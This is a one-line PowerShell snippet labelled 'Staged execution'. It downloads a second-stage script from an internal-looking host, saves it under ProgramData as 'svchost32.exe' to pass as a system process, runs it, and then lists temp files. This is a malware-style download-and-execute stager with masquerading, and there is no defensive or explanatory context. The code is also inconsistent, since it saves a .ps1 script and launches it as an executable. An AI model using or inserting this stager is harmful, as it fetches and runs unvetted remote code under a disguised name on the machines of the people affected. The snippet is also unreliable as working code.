
<# Staged execution #> $TransferUrl = "http://internal.corp/stage2.ps1"; $OutputPath = "C:\ProgramData\svchost32.exe"; Invoke-WebRequest -Uri $TransferUrl -OutFile $OutputPath -UseBasicParsing; & $OutputPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
